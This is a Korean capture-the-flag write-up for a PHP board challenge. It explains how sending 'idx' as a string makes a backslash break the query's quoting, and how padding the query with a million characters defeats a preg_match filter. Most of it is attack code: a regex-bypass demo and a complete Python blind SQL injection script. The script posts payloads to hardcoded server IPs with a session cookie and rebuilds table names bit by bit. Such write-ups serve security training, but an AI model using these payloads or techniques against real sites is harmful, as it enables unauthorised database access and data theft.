# solution

취약점 종류

1. SQL Injeciton
2. php trick

sql injection escape 
```php
function str_escape($argv){
	if(is_array($argv)){
		foreach ($argv as $key => $value) {
			if(is_array($value)){
				$array[$key] = str_escape($value);
			}
			else{
				$array[$key] = addslashes($value);
			}
		}
	}
	else{
		$array = addslashes($argv);
	}
	return $array;
}

$_GET = str_escape($_GET);
$_POST = str_escape($_POST);
```

action_lib.php do_delete function
```php
if($mode === 'multi'){
	$uploader = $_POST['uploader'];

	$idx_list = array();
	for($i=0; $i<=count($_POST['idx'])-1; $i++){
		$idx = $_POST['idx'][$i];
		$result = mysqli_fetch_array(mysqli_query($con, sqli_block("SELECT * FROM board WHERE idx='{$idx}' AND uploader_id='{$uploader}';")), MYSQLI_ASSOC);				
		if($result['uploader_id'] === $_SESSION['id']){
			$idx_list[] = $idx;
		}
		else{
			alert('are you hacker?');
		}				
	}
	for($i=0; $i<=count($idx_list); $i++){
		mysqli_query($con, sqli_block("DELETE FROM board WHERE idx='{$idx_list[$i]}';"));
	}
	die("<script>alert('Delete!');location.href='index.php';</script>");
}
```

여기서 idx를 POST로 idx[]=1&idx[]=2&idx[]=3 이러한 형태로 보내주는데 여기에 아무리 \나 '를 넣어봤자 sql injection은 터지지가 않는다.
하지만 Array로 날라가는 형식을 String으로 보내 준다면 말이 달라진다. ex) idx=\

```php
$idx = $_POST['idx'][$i];
```
이 부분에서 idx가 Array일 경우에는 0번째 배열이 가져와지는데 String일 경우에는 String의 0번째가 가져와지며 만약 \를 넣었을경우 escape함수 때문에 \' 로 바뀐 String에서 \가 가져와 지며 동시에 SQL Injection취약점이 터진다.


이제 SQL Injection은 찾았으면 다음은 정규식을 우회 해줘야한다.

```php
function sqli_block($argv){
	$pattern = '/^select.*from.*where.*`?information_schema`?.*$/is';
	if(preg_match($pattern, $argv)) alert('hack me if you can');
	return $argv;
}
```
이렇게 정규식을 보면 아무리 봐도 취약점이 없지만 php trick을 이용하면 말이 달라진다.
사실 trick은 간단하다 그냥 뒤에 a나 String을 존나게 넣어주면 바이패스 된다.

example source code
```php
<?php
function sqli_block($argv){
        $pattern = '/^select.*from.*where.*`?information_schema`?.*$/is';
        if(preg_match($pattern, $argv)) die("hack me if you can\n");
        return $argv;
}

$query = "select * from table where id='' union select table_name from information_schema.tables#".str_repeat('a', 1000000);

if(sqli_block($query)) die("bypass\n");
?>
```
execute result
```
root@ubuntu:/tmp# php aa.php
bypass
```

이런식으로 우회 하면된다.

exploit code
```python
import requests

i = 1
find = ""
while True:
	_bin = ""
	for j in range(1, 8):
		#url = "http://10.211.55.3/secuinside/web2/index.php?page=delete&mode=multi" # local
		#url = "http://52.79.204.104/index.php?page=delete&mode=multi" # server 1
		url = "http://52.79.202.247/index.php?page=delete&mode=multi" # server 2
		header = {"Content-Type":"application/x-www-form-urlencoded","Cookie":"PHPSESSID=k110bp45hh27o8q1nhhj6bcr33"}

		#payload  union select 1,group_concat(table_name,0x3a,column_name) from information_schema.columns where table_schema=database()#"+"a"*1000000
		#uploader=adm1nkyj&idx%5B%5D=16&idx%5B%5D=17
		payload = {
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(flag),{},1))={},0x61646d316e6b796a,0),4,5 from read_me#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(table_name),{},1))={},0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(1=1,0x61646d316e6b796a,0),4,5 from read_me#".format(i, j)+"a"*1000000,
					#"uploader":" union select 1,2,if(ascii(substr(group_concat(table_name),"+str(i)+",1))="+str(j)+",0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"+"a"*1000000,
					#"substr(lpad(bin(ascii(substr(table_name,"+str(i)+",1))),"+str(j)+",0),1,1)"
					"uploader":"union select 1,2,if(substr(lpad(bin(ascii(substr(table_name,"+str(i)+",1))),7,0),"+str(j)+",1)=1,0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"+"a"*1000000,
					"idx":"\\",
				  }
		#print " union select 1,2,if(ascii(substr(group_concat(table_name),"+str(i)+",1))="+str(j)+",0x61646d316e6b796a,0),4,5 from information_schema.tables where table_schema=database()#"
		content = requests.post(url, data=payload, headers=header).text
		#print content
		if content.find('Delete!') != -1:
			_bin += "1"
		else:
			_bin += "0"
	find += chr(int(_bin, 2))
	print find
	i += 1

```